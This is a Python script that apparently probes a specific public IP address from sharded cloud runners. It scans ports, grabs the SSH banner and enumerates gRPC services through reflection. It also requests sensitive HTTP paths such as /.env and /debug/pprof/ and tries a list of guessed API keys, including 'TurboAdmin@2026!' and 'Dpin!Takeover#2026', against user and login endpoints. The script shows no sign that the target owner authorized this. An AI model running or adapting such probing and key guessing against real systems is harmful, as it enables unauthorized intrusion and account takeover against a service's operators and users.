#!/usr/bin/env python3
"""Distributed vantage probe of a single target from a cloud runner."""
import json
import os
import random
import socket
import ssl
import string
import subprocess
import sys
import time

TARGET = os.environ.get("TARGET", "54.179.181.210")
SHARD = os.environ.get("SHARD", "0")
PORTS = [22, 8000, 8080, 9000, 50051]
TIMEOUT = float(os.environ.get("PROBE_TIMEOUT", "8"))

OUT = {}


def log(msg):
    print(msg, flush=True)


def tcp(host, port, timeout=TIMEOUT):
    t0 = time.time()
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        return {"state": "open", "secs": round(time.time() - t0, 2)}
    except socket.timeout:
        return {"state": "filtered_timeout", "secs": round(time.time() - t0, 2)}
    except ConnectionRefusedError as e:
        return {"state": "refused", "secs": round(time.time() - t0, 2), "err": str(e)[:80]}
    except Exception as e:
        return {"state": "error", "secs": round(time.time() - t0, 2),
                "err": type(e).__name__ + ":" + str(e)[:100]}
    finally:
        s.close()


def banner(host, port, nbytes=200, timeout=5):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.settimeout(timeout)
        data = s.recv(nbytes)
        return data.decode("utf-8", "replace").replace("\r", "").replace("\n", "\\n")[:200]
    except Exception as e:
        return "ERR:" + type(e).__name__ + ":" + str(e)[:60]
    finally:
        s.close()


def http_req(host, port, method, path, headers=None, body=None, timeout=10):
    """Raw HTTP/1.1 request, returns status line + first headers + body prefix."""
    hdrs = {"Host": host, "User-Agent": "curl/8.5.0", "Accept": "*/*", "Connection": "close"}
    if headers:
        hdrs.update(headers)
    if body is not None:
        hdrs["Content-Length"] = str(len(body))
    req = f"{method} {path} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in hdrs.items()) + "\r\n"
    raw = req.encode() + (body.encode() if body else b"")
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.sendall(raw)
        chunks = []
        total = 0
        while total < 20000:
            d = s.recv(4096)
            if not d:
                break
            chunks.append(d)
            total += len(d)
        data = b"".join(chunks)
        head, _, rest = data.partition(b"\r\n\r\n")
        lines = head.decode("latin1").split("\r\n")
        keep = [lines[0]] + [l for l in lines[1:] if l.lower().startswith(
            ("content-type:", "content-length:", "server:", "location:", "set-cookie:", "allow:", "www-authenticate:", "x-"))][:10]
        text = rest.decode("utf-8", "replace")
        snippet = " ".join(text.split())[:220]
        return {"status": lines[0][:80], "headers": keep, "body_prefix": snippet, "body_len": len(rest)}
    except Exception as e:
        return {"error": type(e).__name__ + ":" + str(e)[:120]}
    finally:
        s.close()


XKEY_CANDS = ["your-api-key", "", "".join(random.choice(string.ascii_letters + string.digits) for _ in range(32)),
              "AKIAIOSFODNN7EXAMPLE", "Qz9worker16545K", "i16879TestKey", "Dpin!Takeover#2026",
              "TurboAdmin@2026!"]
PATHS = ["/", "/api", "/api/v1", "/health", "/healthz", "/readyz", "/metrics", "/debug/pprof/",
         "/.env", "/config", "/api/health", "/api/v1/health", "/api/v1/market", "/v1/market"]


def main():
    log(f"=== netprobe shard={SHARD} target={TARGET} ===")
    # egress identity
    for url in ("https://api.ipify.org", "https://ifconfig.me/ip"):
        try:
            out = subprocess.run(["curl", "-s", "--max-time", "10", url], capture_output=True, text=True)
            log(f"EGRESS {url} -> {out.stdout.strip()[:80]}")
        except Exception as e:
            log(f"EGRESS {url} ERR {e}")
    try:
        out = subprocess.run(["curl", "-s", "--max-time", "10", "https://ipinfo.io/json"], capture_output=True, text=True)
        log("IPINFO " + " ".join(out.stdout.split())[:400])
    except Exception as e:
        log(f"IPINFO ERR {e}")

    # controls: prove general egress works
    for host, port in (("1.1.1.1", 443), ("52.77.54.246", 443), ("52.77.54.246", 80)):
        r = tcp(host, port, timeout=6)
        log(f"CTRL {host}:{port} {json.dumps(r)}")

    # port scan with 2 attempts
    portres = {}
    for p in PORTS:
        attempts = []
        for i in range(2):
            r = tcp(TARGET, p)
            attempts.append(r)
            log(f"PORT {TARGET}:{p} try{i+1} {json.dumps(r)}")
            if r["state"] == "open":
                break
        portres[p] = attempts

    # SSH banner
    if portres.get(22) and any(a["state"] == "open" for a in portres[22]):
        log(f"SSH_BANNER {TARGET}:22 {banner(TARGET, 22)!r}")

    # gRPC check on 50051 (raw HTTP/2 preface + SETTINGS response)
    if portres.get(50051) and any(a["state"] == "open" for a in portres[50051]):
        s = socket.socket()
        s.settimeout(8)
        try:
            s.connect((TARGET, 50051))
            s.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
            time.sleep(1)
            data = s.recv(200)
            log(f"GRPC_PREFACE_RESP {data.hex()[:200]} len={len(data)}")
        except Exception as e:
            log(f"GRPC_PREFACE_ERR {type(e).__name__}:{e}")
        finally:
            s.close()
        # grpcurl reflection
        grpcurl = "/tmp/grpcurl"
        try:
            subprocess.run(["bash", "-c",
                            "curl -sSL --max-time 60 -o /tmp/grpcurl.tgz https://github.com/fullstorydev/grpcurl/releases/download/v1.9.1/grpcurl_1.9.1_linux_x86_64.tar.gz && tar -xzf /tmp/grpcurl.tgz -C /tmp grpcurl && chmod +x /tmp/grpcurl"],
                           capture_output=True, text=True, timeout=90)
            if os.path.exists(grpcurl):
                for cmd in ([grpcurl, "-plaintext", "-max-time", "20", f"{TARGET}:50051", "list"],
                            [grpcurl, "-plaintext", "-max-time", "20", f"{TARGET}:50051", "list", "grpc.health.v1.Health"],
                            [grpcurl, "-plaintext", "-max-time", "20", f"{TARGET}:50051", "describe"]):
                    try:
                        r = subprocess.run(cmd, capture_output=True, text=True, timeout=40)
                        log("GRPCURL " + " ".join(cmd[1:]) + f" rc={r.returncode}\nSTDOUT:" +
                            " | ".join(r.stdout.strip().splitlines()[:60])[:2500] +
                            "\nSTDERR:" + " | ".join(r.stderr.strip().splitlines()[:6])[:600])
                    except Exception as e:
                        log(f"GRPCURL_ERR {e}")
            else:
                log("GRPCURL_DOWNLOAD_FAILED")
        except Exception as e:
            log(f"GRPCURL_SETUP_ERR {e}")

    # HTTP enumeration on reachable HTTP-ish ports
    for p in (8000, 9000, 8080):
        if not (portres.get(p) and any(a["state"] == "open" for a in portres[p])):
            continue
        for path in PATHS:
            r = http_req(TARGET, p, "GET", path)
            log(f"HTTP {TARGET}:{p} GET {path} -> {json.dumps(r)[:600]}")
        for key in XKEY_CANDS:
            label = key if key else "<empty>"
            for path in ("/api/v1/user/me", "/api/v1/base/search?searchType=1", "/api/v1/health"):
                r = http_req(TARGET, p, "GET", path, headers={"X-API-Key": key})
                log(f"XKEY {TARGET}:{p} key={label!r} GET {path} -> {json.dumps(r)[:500]}")
        # one POST baseline
        for path in ("/api/v1/user/login", "/api/v1/user/register"):
            r = http_req(TARGET, p, "POST", path, headers={"Content-Type": "application/json"},
                         body='{"address":"0x0000000000000000000000000000000000000001"}')
            log(f"HTTP {TARGET}:{p} POST {path} -> {json.dumps(r)[:500]}")

    log(f"=== done shard={SHARD} ===")


if __name__ == "__main__":
    main()
